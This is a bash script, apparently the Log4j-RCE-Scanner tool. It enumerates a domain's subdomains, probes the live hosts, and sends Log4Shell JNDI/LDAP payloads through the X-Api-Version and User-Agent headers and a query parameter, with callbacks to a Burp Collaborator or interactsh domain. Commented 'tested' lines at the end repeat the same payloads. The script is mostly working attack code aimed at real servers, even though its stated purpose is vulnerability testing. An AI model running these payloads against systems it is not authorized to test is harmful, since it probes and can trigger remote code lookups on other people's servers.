#! /bin/bash

#        :::'###::::'########::'####:'##::::::::'######:::'#######::'##:::'##:'########:::::'###::::'##:::::::'####:
#        ::'## ##::: ##.... ##:. ##:: ##:::::::'##... ##:'##.... ##:. ##:'##:: ##.... ##:::'## ##::: ##:::::::. ##::
#        :'##:. ##:: ##:::: ##:: ##:: ##::::::: ##:::..:: ##:::: ##::. ####::: ##:::: ##::'##:. ##:: ##:::::::: ##::
#        :##:::. ##: ##:::: ##:: ##:: ##:::::::. ######:: ##:::: ##:::. ##:::: ########::'##:::. ##: ##:::::::: ##::
#        :#########: ##:::: ##:: ##:: ##::::::::..... ##: ##:::: ##:::: ##:::: ##.... ##: #########: ##:::::::: ##::
#        :##.... ##: ##:::: ##:: ##:: ##:::::::'##::: ##: ##:::: ##:::: ##:::: ##:::: ##: ##.... ##: ##:::::::: ##::
#        :##:::: ##: ########::'####: ########:. ######::. #######::::: ##:::: ########:: ##:::: ##: ########:'####:
#        :.:::::..::........:::....::........:::......::::.......::::::..:::::........:::..:::::..::........::....::
#        01000001 01100100 01101001 01101100 01110011 01101111 01111001 01100010 01100001 01101100 01101001
#        https://github.com/adilsoybali
#        https://adilsoybali.com
#        https://seccops.com

doesCommandExist() {
    command -v "$1" >/dev/null 2>&1
    if [[ $? -ne 0 ]]; then
      echo -e "$(tput setaf 3)$1 $(tput sgr0)"
    fi
}

domainScan-DoesCommandExistReqText() {
    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "assetfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "subfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "amass" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
      echo -e "\n$(tput setaf 3 ; tput rev ; tput bold) ! Warning ! $(tput sgr0)"      
      echo -e "$(tput setaf 3)Using this feature requires special requirements. It has been detected that the requirements are not installed on your system. $(tput sgr0)"
      echo -e "\n$(tput setaf 3 ; tput bold)Please install these tools: $(tput sgr0)"
    fi
}

domainScan-DoesCommandExistReqExit() {
    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "assetfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "subfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "amass" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
      exit
    fi
}

listScan-DoesCommandExistReqText() {
    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
      echo -e "\n$(tput setaf 3 ; tput rev ; tput bold) ! Warning ! $(tput sgr0)"      
      echo -e "$(tput setaf 3)Using this feature requires special requirements. It has been detected that the requirements are not installed on your system. $(tput sgr0)"
      echo -e "\n$(tput setaf 3 ; tput bold)Please install these tools: $(tput sgr0)"
    fi
}

listScan-DoesCommandExistReqExit() {
    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
      exit
    fi
}

doesCommandExistReqMoreInfo() {
    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "assetfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "subfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "amass" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
      echo -e "$(tput setaf 4 ; tput bold)\n$(tput setaf 4 ; tput bold)More Info: $(tput smul)https://github.com/adilsoybali/Log4j-RCE-Scanner#requirements$(tput rmul) $(tput sgr0)\n"
    fi
}

showHelp() {
cat << EOF  
$(tput setaf 2)
Usage: 
$0 -l httpxsubdomains.txt -b yrt45r4sjyoj19617jem5briio3cs.burpcollaborator.net
$0 -d adilsoybali.com -b yrt45r4sjyoj19617jem5briio3cs.burpcollaborator.net

-h, --help              Display help

-l, --url-list          List of domain/subdomain/ip to be used for scanning.

-d, --domain            The domain name to which all subdomains and itself will be checked.

-b, --burpcollabid      Burp collabrator client id address or interactsh domain address.
$(tput sgr0)
EOF
}

domainScan() {
    domainScan-DoesCommandExistReqText
    for COMMAND in "curl" "httpx" "assetfinder" "subfinder" "amass"; do
      doesCommandExist "${COMMAND}"
    done
    doesCommandExistReqMoreInfo
    domainScan-DoesCommandExistReqExit
    echo -e "\n$(tput setaf 2 ; tput rev ; tput bold) Subfinder is working $(tput sgr0)\n" ; subfinder -silent -d sub.$domain >> sub.$domain ; echo -e "\n$(tput setaf 2 ; tput rev ; tput bold) Assetfinder is working $(tput sgr0)\n" ; assetfinder -subs-only $domain >> sub.$domain ; echo -e "\n$(tput setaf 2 ; tput rev ; tput bold) Amass is working $(tput sgr0)\n" ; amass enum -norecursive --silent -noalts -d $domain >> sub.$domain ; cat sub.$domain | sort -u | httpx -silent | while read url; do 
    url_without_protocol=$(echo $url | sed 's|https://||g' | sed 's|http://||g')
    url_without_protocol_and_port=$(echo $url_without_protocol | sed 's|:.*||g')
    echo 'curl -s --insecure --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
    echo 'curl -s --insecure --max-time 20 '$url/?test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a\\\}}'|g" | sed "s|\$url|$url|g" | bash
    echo 'curl -s --insecure --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
    echo -e "\033[104m[ DOMAIN ==> $url ]\033[0m" "\n" "\033[92m Method 1 ==> X-Api-Version: running-Ldap-payload" "\n" " Method 2 ==> Useragent: running-Ldap-payload" "\n" " Method 3 ==> $url/?test=running-Ldap-payload" "\n\033[0m";done
}

listScan() {
    listScan-DoesCommandExistReqText
    for COMMAND in "curl" "httpx"; do
      doesCommandExist "${COMMAND}"
    done
    doesCommandExistReqMoreInfo
    listScan-DoesCommandExistReqExit
    cat $list | sort -u | httpx -silent | while read url; do 
    url_without_protocol=$(echo $url | sed 's|https://||g' | sed 's|http://||g')
    url_without_protocol_and_port=$(echo $url_without_protocol | sed 's|:.*||g')
    echo 'curl -s --insecure --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
    echo 'curl -s --insecure --max-time 20 '$url/?test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a\\\}}'|g" | sed "s|\$url|$url|g" | bash
    echo 'curl -s --insecure --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
    echo -e "\033[104m[ DOMAIN ==> $url ]\033[0m" "\n" "\033[92m Method 1 ==> X-Api-Version: running-Ldap-payload" "\n" " Method 2 ==> Useragent: running-Ldap-payload" "\n" " Method 3 ==> $url/?test=running-Ldap-payload" "\n\033[0m";done
}

while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
  -l | --url-list )
    list="$2"
    if [[ "$3" == "-b" || "$3" == "--burpcollabid" ]]; then
    burpcollabid="$4"
    else
    showHelp
    exit
    fi
    listScan
    exit
    ;;
  -d | --domain )
    domain="$2"
    if [[ "$3" == "-b" || "$3" == "--burpcollabid" ]]; then
    burpcollabid="$4"
    else
    showHelp
    exit
    fi
    domainScan
    exit
    ;;
  *)
    showHelp
    exit
    ;;
esac; shift; done
if [[ "$1" == '--' ]]; then
shift
else
showHelp
exit
fi

# tested 1
# echo 'curl -s $url -H 'log4jPayload'' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash

# tested 2
# echo 'curl -s '$url/?test=log4jPayload'' | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$burpcollabid/a\\\}}'|g" | sed "s|\$url|$url|g" | bash

# tested 3
# echo 'curl -s $url -H 'log4jPayload'' | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
